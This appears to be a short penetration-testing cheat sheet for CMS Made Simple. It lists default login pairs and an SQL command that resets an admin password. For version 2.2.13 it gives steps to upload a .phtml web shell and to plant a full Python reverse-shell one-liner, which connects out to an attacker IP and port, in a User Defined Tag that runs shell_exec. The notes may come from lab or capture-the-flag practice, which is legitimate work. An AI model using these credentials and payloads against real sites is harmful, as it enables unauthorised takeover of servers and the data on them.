# cms made simple

## Default Creds:

```bash
root:root
bitnami:bitnami
root:bitnami
```

## Update Admin Pass via sql

```bash
https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'NEW_PASSWORD'))) where username = 'USER_NAME'
```

## v 2.2.13

```bash
# to upload shell as .phtml
Content> File Manager
Invoke: /uploads/web.phtml

[OR] https://www.exploit-db.com/exploits/48779 also works

[OR]
Dashboard > Extensions > User Defined Tags > Create New as "shell" > Save
code: shell_exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");
Dashboard > Content > Content Manager > Add New Content > Save
Content: {{shell}}
Invoke: IP/index.php?page=shell
```
